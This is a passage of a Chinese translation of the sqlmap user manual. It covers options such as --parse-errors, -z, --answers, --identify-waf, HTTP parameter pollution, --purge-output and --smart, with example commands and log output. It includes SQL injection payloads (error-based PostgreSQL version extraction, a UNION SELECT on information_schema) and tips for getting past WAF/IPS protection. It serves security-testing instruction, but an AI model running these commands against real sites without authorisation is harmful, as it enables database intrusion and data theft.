    5849=CAST((CHR(58)\|\|CHR(118)\|\|CHR(116)\|\|CHR(106)\|\|CHR(58))\|\|(ENCODE(CONVERT_TO((COALESCE(CAST(VERSION()
    AS
    CHARACTER(10000)),(CHR(32)))),(CHR(85)\|\|CHR(84)\|\|CHR(70)\|\|CHR(56))),(CHR(72)\|\|CHR(69)\|\|CHR(88))))::text\|\|(CHR(58)\|\|CHR(110)\|\|CHR(120)\|\|CHR(98)\|\|CHR(58))
    AS NUMERIC)
    [xx:xx:15] [INFO] parsed error message: 'pg_query() [\function.pg-query\]: Query failed: ERROR: invalid
    input syntax for type numeric:
    ":vtj:506f737467726553514c20382e332e39206f6e20693438362d70632d6c696e75782d676e752c20636f6d70696c656420627920474343206763632d342e332e7265616c202844656269616e2032e332e322d312e312920342e332e32:nxb:"
    in \/var/www/sqlmap/libs/pgsql.inc.php\ on line \35\'
    [xx:xx:15] [INFO] retrieved: PostgreSQL 8.3.9 on i486-pc-linux-gnu, compiled by
    GCC gcc-4.3.real (Debian 4.3.2-1.1) 4.3.2
    [...]
**自定义输出的路径**
参数：`–output-dir`
sqlmap默认把session文件跟结果文件保存在output文件夹下，用此参数可自定义输出路径  
例如：`–output-dir=/tmp`
**从响应中获取DBMS的错误信息**
参数：`–parse-errors`
有时目标没有关闭DBMS的报错，当数据库语句错误时，会输出错误语句，用词参数可以会显出错误信息。
    $ python sqlmap.py -u "http://192.168.21.129/sqlmap/mssql/iis/get_int.asp?id=1"
    --parse-errors
    [...]
    [11:12:17] [INFO] ORDER BY technique seems to be usable. This should reduce the
    time needed to find the right number of query columns. Automatically extending
    the range for current UNION query injection technique test
    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC
    Drivers (0x80040E14)
    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 10
    is out of range of the number of items in the select list.
    \/sqlmap/mssql/iis/get_int.asp, line 27\'
    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC
    Drivers (0x80040E14)
    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 6 is
    out of range of the number of items in the select list.
    \/sqlmap/mssql/iis/get_int.asp, line 27\'
    [11:12:17] [INFO] parsed error message: 'Microsoft OLE DB Provider for ODBC
    Drivers (0x80040E14)
    [Microsoft][ODBC SQL Server Driver][SQL Server]The ORDER BY position number 4 is
    out of range of the number of items in the select list.
    \/sqlmap/mssql/iis/get_int.asp, line 27\'
    [11:12:17] [INFO] target URL appears to have 3 columns in query
    [...]
#### 其他的一些参数
**使用参数缩写**
参数：`-z`
有使用参数太长太复杂，可以使用缩写模式。 例如：
    python sqlmap.py --batch --random-agent --ignore-proxy --technique=BEU -u
    "www.target.com/vuln.php?id=1"
可以写成：
    python sqlmap.py -z "bat,randoma,ign,tec=BEU" -u "www.target.com/vuln.php?id=1"
还有：
    python sqlmap.py --ignore-proxy --flush-session --technique=U --dump -D testdb
    -T users -u "www.target.com/vuln.php?id=1"
可以写成：
    python sqlmap.py -z "ign,flu,bat,tec=U,dump,D=testdb,T=users" -u
    "www.target.com/vuln.php?id=1"
**成功SQL注入时警告**
参数：`–alert`
**设定会发的答案**
参数：`–answers`
当希望`sqlmap`提出输入时，自动输入自己想要的答案可以使用此参数： 例子：
    $ python sqlmap.py -u
    "http://192.168.22.128/sqlmap/mysql/get_int.php?id=1"--technique=E
    --answers="extending=N" --batch
    [...]
    [xx:xx:56] [INFO] testing for SQL injection on GET parameter 'id'
    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you
    want to skip test payloads specific for other DBMSes? [Y/n] Y
    [xx:xx:56] [INFO] do you want to include all tests for 'MySQL' extending
    provided level (1) and risk (1)? [Y/n] N
    [...]
**发现SQL注入时发出蜂鸣声**
参数：`–beep`
发现sql注入时，发出蜂鸣声。
**启发式检测WAF/IPS/IDS保护**
参数：`–check-waf`
`WAF/IPS/IDS`保护可能会对`sqlmap`造成很大的困扰，如果怀疑目标有此防护的话，可以使用此参数来测试。`sqlmap`将会使用一个不存在的参数来注入测试
例如：
    &foobar=AND 1=1 UNION ALL SELECT 1,2,3,table_name FROM information_schema.tables
    WHERE 2>1
如果有保护的话可能返回结果会不同。
**清理sqlmap的UDF(s)和表**
参数：`–cleanup`
清除sqlmap注入时产生的udf与表。
**禁用彩色输出**
参数：`–disable-coloring`
sqlmap默认彩色输出，可以使用此参数，禁掉彩色输出。
**使用指定的Google结果页面**
参数：`–gpage`
默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试。
**使用HTTP参数污染**
参数：`-hpp`
HTTP参数污染可能会绕过`WAF/IPS/IDS`保护机制，这个对`ASP/IIS与ASP.NET/IIS`平台很有效。
**测试WAF/IPS/IDS保护**
参数：`–identify-waf`
sqlmap可以尝试找出WAF/IPS/IDS保护，方便用户做出绕过方式。目前大约支持30种产品的识别。
例如对一个受到ModSecurity WAF保护的MySQL例子：
    $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1"
    --identify-waf -v 3
    [...]
    [xx:xx:23] [INFO] testing connection to the target URL
    [xx:xx:23] [INFO] heuristics detected web page charset 'ascii'
    [xx:xx:23] [INFO] using WAF scripts to detect backend WAF/IPS/IDS protection
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'USP Secure Entry Server
    (United Security Providers)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'BinarySEC Web Application
    Firewall (BinarySEC)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetContinuum Web
    Application Firewall (NetContinuum/Barracuda Networks)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Hyperguard Web Application
    Firewall (art of defence Inc.)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Cisco ACE XML Gateway
    (Cisco Systems)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'TrafficShield (F5
    Networks)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Teros/Citrix Application
    Firewall Enterprise (Teros/Citrix Systems)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KONA Security Solutions
    (Akamai Technologies)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Incapsula Web Application
    Firewall (Incapsula/Imperva)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'CloudFlare Web Application
    Firewall (CloudFlare)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Barracuda Web Application
    Firewall (Barracuda Networks)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'webApp.secure (webScurity)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Proventia Web Application
    Security (IBM)'
    [xx:xx:23] [DEBUG] declared web page charset 'iso-8859-1'
    [xx:xx:23] [DEBUG] page not found (404)
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'KS-WAF (Knownsec)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'NetScaler (Citrix Systems)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'Jiasule Web Application
    Firewall (Jiasule)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'WebKnight Application
    Firewall (AQTRONIX)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'AppWall (Radware)'
    [xx:xx:23] [DEBUG] checking for WAF/IDS/IPS product 'ModSecurity: Open Source
    Web Application Firewall (Trustwave)'
    [xx:xx:23] [CRITICAL] WAF/IDS/IPS identified 'ModSecurity: Open Source Web
    Application Firewall (Trustwave)'. Please consider usage of tamper scripts
    (option '--tamper')
    [...]
**模仿智能手机**
参数：`–mobile`
有时服务端只接收移动端的访问，此时可以设定一个手机的`User-Agent`来模仿手机登陆。
例如：
    $ python sqlmap.py -u "http://www.target.com/vuln.php?id=1" --mobile
    [...]
    which smartphone do you want sqlmap to imitate through HTTP User-Agent header?
    [1] Apple iPhone 4s (default)
    [2] BlackBerry 9900
    [3] Google Nexus 7
    [4] HP iPAQ 6365
    [5] HTC Sensation
    [6] Nokia N97
    [7] Samsung Galaxy S
    \> 1
    [...]
**安全的删除output目录的文件**
参数：`–purge-output`
有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。
例如：
    $ python sqlmap.py --purge-output -v 3
    [...]
    [xx:xx:55] [INFO] purging content of directory '/home/user/sqlmap/output'...
    [xx:xx:55] [DEBUG] changing file attributes
    [xx:xx:55] [DEBUG] writing random data to files
    [xx:xx:55] [DEBUG] truncating files
    [xx:xx:55] [DEBUG] renaming filenames to random values
    [xx:xx:55] [DEBUG] renaming directory names to random values
    [xx:xx:55] [DEBUG] deleting the whole directory tree
    [...]
**启发式判断注入**
参数：`–smart`
有时对目标非常多的URL进行测试，为节省时间，只对能够快速判断为注入的报错点进行注入，可以使用此参数。
例子：
    $ python sqlmap.py -u
    "http://192.168.21.128/sqlmap/mysql/get_int.php?ca=17&user=foo&id=1" --batch
    --smart
    [...]
    [xx:xx:14] [INFO] testing if GET parameter 'ca' is dynamic
    [xx:xx:14] [WARNING] GET parameter 'ca' does not appear dynamic
    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'ca' might
    not be injectable
    [xx:xx:14] [INFO] skipping GET parameter 'ca'
    [xx:xx:14] [INFO] testing if GET parameter 'user' is dynamic
    [xx:xx:14] [WARNING] GET parameter 'user' does not appear dynamic
    [xx:xx:14] [WARNING] heuristic (basic) test shows that GET parameter 'user'
    might not be injectable
    [xx:xx:14] [INFO] skipping GET parameter 'user'
    [xx:xx:14] [INFO] testing if GET parameter 'id' is dynamic
    [xx:xx:14] [INFO] confirming that GET parameter 'id' is dynamic
    [xx:xx:14] [INFO] GET parameter 'id' is dynamic
    [xx:xx:14] [WARNING] reflective value(s) found and filtering out
    [xx:xx:14] [INFO] heuristic (basic) test shows that GET parameter 'id' might be
    injectable (possible DBMS: 'MySQL')
    [xx:xx:14] [INFO] testing for SQL injection on GET parameter 'id'
    heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you
    want to skip test payloads specific for other DBMSes? [Y/n] Y
    do you want to include all tests for 'MySQL' extending provided level (1) and
    risk (1)? [Y/n] Y
    [xx:xx:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
    [xx:xx:14] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or
    HAVING clause' injectable
    [xx:xx:14] [INFO] testing 'MySQL \>= 5.0 AND error-based - WHERE or HAVING
    clause'
    [xx:xx:14] [INFO] GET parameter 'id' is 'MySQL \>= 5.0 AND error-based - WHERE
    or HAVING clause' injectable
    [xx:xx:14] [INFO] testing 'MySQL inline queries'
    [xx:xx:14] [INFO] testing 'MySQL \> 5.0.11 stacked queries'
    [xx:xx:14] [INFO] testing 'MySQL \ 5.0.11 AND time-based blind'
    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL \> 5.0.11 AND time-based blind'
    injectable
    [xx:xx:24] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
    [xx:xx:24] [INFO] automatically extending ranges for UNION query injection
    technique tests as there is at least one other potential injection technique
    found
    [xx:xx:24] [INFO] ORDER BY technique seems to be usable. This should reduce the
    time needed to find the right number of query columns. Automatically extending
    the range for current UNION query injection technique test
    [xx:xx:24] [INFO] target URL appears to have 3 columns in query
    [xx:xx:24] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20
    columns' injectable
    [...]
**初级用户向导参数**
参数：`–wizard`面向初级用户的参数，可以一步一步教你如何输入针对目标注入。
参考资料：
安全牛课堂`-kali-linux-web`篇
sqlmap用户手册中文版：
sqlmap用户手册：